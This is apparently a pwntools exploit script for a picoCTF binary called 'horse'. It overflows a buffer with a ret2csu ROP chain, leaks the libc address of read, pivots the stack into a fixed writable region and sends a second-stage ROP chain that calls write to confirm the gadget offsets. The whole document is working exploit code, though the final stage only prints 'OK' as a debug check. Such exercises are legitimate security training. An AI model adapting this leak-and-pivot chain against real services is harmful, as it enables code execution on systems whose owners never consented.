from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602020 
    payload = b'A' * 32
    payload += b'B' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x500)
    payload += p64(csu_call)
    payload += b'J' * 8 
    payload += p64(csu_pop)
    payload += p64(0) + p64(heap_stack) + p64(0) * 4 + p64(leave_ret) 

    r.sendline(payload)
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        print(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except:
        exit()

leaked_read = leak_read()

off_read_9 = 0x110fa0
off_write_9 = 0x111040
off_pop_rdi_9 = 0x26b72
off_pop_rsi_9 = 0x27529
off_pop_rdx_9 = 0x11c1e1

shift = 0x190

addr_write = leaked_read - off_read_9 + off_write_9
# UNSHIFTED POP RDI
gadget_pop_rdi = leaked_read - off_read_9 - shift + off_pop_rdi_9
gadget_pop_rsi = leaked_read - off_read_9 - shift + off_pop_rsi_9
gadget_pop_rdx = leaked_read - off_read_9 + off_pop_rdx_9 # Shifted

# Stage 2 ROP (Debug)
payload2 = b'J' * 8 
payload2 += p64(gadget_pop_rdi)

ok_str = 0x602020 + 0x100 

payload2 += p64(1)
payload2 += p64(gadget_pop_rsi) + p64(ok_str)
payload2 += p64(gadget_pop_rdx) + p64(2) + p64(0) 
payload2 += p64(addr_write)

payload2 = payload2.ljust(0x100, b'\x90')
payload2 += b'OK'

print("Sending Stage 2 payload (Unshifted RDI)...")
time.sleep(0.5)
r.sendline(payload2)

try:
    out = r.recvn(2)
    if out == b'OK':
        print("Stage 2 executed! Gadgets are CORRECT.")
    else:
        print(f"Stage 2 output: {out}")
except:
    print("Stage 2 crashed")

r.close()
